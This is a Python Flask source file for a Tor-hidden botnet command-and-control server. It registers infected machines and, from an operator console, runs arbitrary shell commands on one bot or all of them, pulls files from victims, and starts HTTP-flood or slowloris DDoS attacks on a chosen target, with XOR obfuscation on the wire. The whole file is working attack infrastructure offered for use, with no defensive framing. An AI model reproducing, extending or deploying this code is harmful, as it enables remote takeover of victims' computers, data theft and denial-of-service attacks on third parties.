from flask import Flask, request, jsonify
import threading
import time
import os
import hashlib
import hmac
import base64
import json
import random
import string

app = Flask(__name__)
BOTS = {}
ATTACK = {}
CMD_LOCK = threading.Lock()
SECRET_FILE = '.c2_secret'

if os.path.exists(SECRET_FILE):
    with open(SECRET_FILE) as f:
        SHARED_SECRET = f.read().strip()
else:
    SHARED_SECRET = hashlib.sha256(os.urandom(32)).hexdigest()[:32]
    with open(SECRET_FILE, 'w') as f:
        f.write(SHARED_SECRET)
    os.chmod(SECRET_FILE, 0o600)

def auth(data):
    if not data or 'token' not in data:
        return False
    expected = hashlib.sha256(f"{data.get('bot_id','')}:{SHARED_SECRET}".encode()).hexdigest()[:16]
    return hmac.compare_digest(data['token'], expected)

def encrypt_out(msg, key_hex):
    """Simple XOR-based transport layer to mask plaintext on wire"""
    key = key_hex.encode() if len(key_hex) < 32 else key_hex[:32].encode()
    data = json.dumps(msg).encode()
    return base64.b64encode(bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])).decode()

def decrypt_in(encoded, key_hex):
    """Reverse XOR transport"""
    key = key_hex.encode() if len(key_hex) < 32 else key_hex[:32].encode()
    data = base64.b64decode(encoded)
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))]).decode()

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    if not auth(data):
        return jsonify({'status': 'auth_failed'}), 403
    bid = data['bot_id']
    BOTS[bid] = {
        'ip': request.remote_addr,
        'os': data.get('os'),
        'hostname': data.get('hostname', ''),
        'cpu': data.get('cpu', 'unknown'),
        'username': data.get('username', ''),
        'last_seen': time.time(),
        'pending_cmd': None,
        'pending_download': None,
        'session_key': hashlib.md5(os.urandom(16)).hexdigest()[:16]
    }
    print(f"\n[+] Bot registered: {bid[:12]} | {data.get('hostname','?')} | {data.get('os','?')} | {data.get('cpu','?')}c")
    return jsonify({'status': 'ok', 'sk': BOTS[bid]['session_key']})

@app.route('/poll', methods=['POST'])
def poll():
    data = request.json
    if not auth(data):
        return jsonify({'status': 'auth_failed'}), 403
    bot_id = data['bot_id']
    if bot_id not in BOTS:
        return jsonify({'status': 'unknown'}), 404
    BOTS[bot_id]['last_seen'] = time.time()
    sk = BOTS[bot_id].get('session_key', SHARED_SECRET[:16])

    with CMD_LOCK:
        if BOTS[bot_id].get('pending_download'):
            dl = BOTS[bot_id]['pending_download']
            BOTS[bot_id]['pending_download'] = None
            return jsonify({'command': 'download', 'path': dl, 'enc': encrypt_out({'command': 'download', 'path': dl}, sk)})

        if BOTS[bot_id].get('pending_cmd'):
            cmd = BOTS[bot_id]['pending_cmd']
            BOTS[bot_id]['pending_cmd'] = None
            return jsonify({'command': 'shell', 'data': cmd, 'enc': encrypt_out({'command': 'shell', 'data': cmd}, sk)})

        if ATTACK.get('active'):
            return jsonify({'command': 'attack', 'target': ATTACK['target'], 'method': ATTACK['method'], 'duration': ATTACK['duration']})

    return jsonify({'command': 'idle'})

@app.route('/result', methods=['POST'])
def result():
    data = request.json
    if not auth(data):
        return jsonify({'status': 'auth_failed'}), 403
    bot_id = data.get('bot_id')
    result_raw = data.get('result', '')
    try:
        decoded = base64.b64decode(result_raw).decode(errors='replace')
        print(f"\n[+] Result from {bot_id[:12]}:\n{decoded[:500]}")
    except:
        print(f"\n[+] Result from {bot_id[:12]}:\n{result_raw[:300]}")
    return jsonify({'status': 'ok'})

@app.route('/download', methods=['POST'])
def download():
    data = request.json
    if not auth(data):
        return jsonify({'status': 'auth_failed'}), 403
    bot_id = data.get('bot_id')
    filename = data.get('filename', 'unknown')
    content = data.get('content', '')
    os.makedirs('downloads', exist_ok=True)
    safe_name = filename.replace('/', '_').replace('..', '')
    path = f"downloads/{bot_id[:12]}_{safe_name}"
    try:
        raw = base64.b64decode(content)
        with open(path, 'wb') as f:
            f.write(raw)
        print(f"\n[+] Downloaded file from {bot_id[:12]}: {filename} -> {path} ({len(raw)} bytes)")
    except:
        with open(path, 'w') as f:
            f.write(content)
        print(f"\n[+] Downloaded file from {bot_id[:12]}: {filename} -> {path}")
    return jsonify({'status': 'ok'})

def control():
    global ATTACK
    while True:
        try:
            cmd = input("C2> ").strip().split()
            if not cmd:
                continue
            if cmd[0] == 'bots':
                now = time.time()
                total = len(BOTS)
                online = sum(1 for b in BOTS.values() if now - b['last_seen'] < 300)
                print(f"\n[+] Bots: {online}/{total} online")
                print(f"{'ID':14s} {'HOSTNAME':20s} {'OS':10s} {'CPU':4s} {'USER':12s} {'LAST SEEN':10s}")
                print("-"*70)
                for bid, info in sorted(BOTS.items(), key=lambda x: x[1]['last_seen'], reverse=True):
                    age = now - info['last_seen']
                    sym = '+' if age < 300 else '~' if age < 900 else '-'
                    print(f" {sym} {bid[:12]:12s} | {info['hostname']:18s} | {info['os']:8s} | {str(info['cpu']):3s} | {info['username']:10s} | {age:4.0f}s")
                print()
            elif cmd[0] == 'secret':
                print(f"\n[+] Shared secret: {SHARED_SECRET}\n")
            elif cmd[0] == 'shell':
                if len(cmd) < 3:
                    print("Usage: shell <bot_id_prefix> <command>")
                    continue
                prefix = cmd[1]
                matches = [bid for bid in BOTS if bid.startswith(prefix)]
                if not matches:
                    print("[-] No matching bot found")
                    continue
                bot_id = matches[0]
                command = ' '.join(cmd[2:])
                with CMD_LOCK:
                    BOTS[bot_id]['pending_cmd'] = command
                print(f"[+] Command queued for {bot_id[:12]}: {command}")
            elif cmd[0] == 'broadcast':
                if len(cmd) < 2:
                    print("Usage: broadcast <command>")
                    continue
                command = ' '.join(cmd[1:])
                with CMD_LOCK:
                    for bid in BOTS:
                        BOTS[bid]['pending_cmd'] = command
                print(f"[+] Broadcast sent to {len(BOTS)} bots: {command}")
            elif cmd[0] == 'download':
                if len(cmd) < 3:
                    print("Usage: download <bot_id_prefix> <remote_path>")
                    continue
                prefix = cmd[1]
                matches = [bid for bid in BOTS if bid.startswith(prefix)]
                if not matches:
                    print("[-] No matching bot found")
                    continue
                with CMD_LOCK:
                    BOTS[matches[0]]['pending_download'] = cmd[2]
                print(f"[+] Download queued from {matches[0][:12]}: {cmd[2]}")
            elif cmd[0] == 'attack':
                if len(cmd) < 4:
                    print("Usage: attack <target> <duration_sec> <method: http|slowloris>")
                    continue
                target = cmd[1]
                duration = int(cmd[2])
                method = cmd[3]
                ATTACK['active'] = True
                ATTACK['target'] = target
                ATTACK['method'] = method
                ATTACK['duration'] = duration
                print(f"[+] Attack started: {method.upper()} on {target} for {duration}s across all bots")
            elif cmd[0] == 'stop':
                ATTACK['active'] = False
                ATTACK.clear()
                print("[+] Attack stopped")
            elif cmd[0] == 'help':
                print("""
Commands:
  bots                          - List all bots with status
  secret                        - Show shared secret
  shell <prefix> <cmd>          - Execute command on a bot
  broadcast <cmd>               - Execute on all bots
  download <prefix> <path>      - Download file from bot
  attack <url> <sec> <method>   - Launch DDoS (http/slowloris)
  stop                          - Stop active attack
  help                          - This menu
                """)
            else:
                print(f"[-] Unknown command: {cmd[0]}")
        except KeyboardInterrupt:
            print("\n[+] Shutting down...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == '__main__':
    print(f"""

  / ____|  _ \ / _ \|  \/  |
 | |    | |_) | | | | \  / |
 | |    |  _ <| | | | |\/| |
 | |____| |_) | |_| | |  | |
  \_____|____/ \___/|_|  |_|

  C2 Server v3.0 — Tor-Enabled
  ─────────────────────────────
  [+] Secret: {SHARED_SECRET}
  [+] Listening on 127.0.0.1:8080
  [+] Hidden service -> Tor -> onion address
  [+] Control interface ready.
    """)
    t = threading.Thread(target=control, daemon=True)
    t.start()
    from waitress import serve
    serve(app, host='127.0.0.1', port=8080)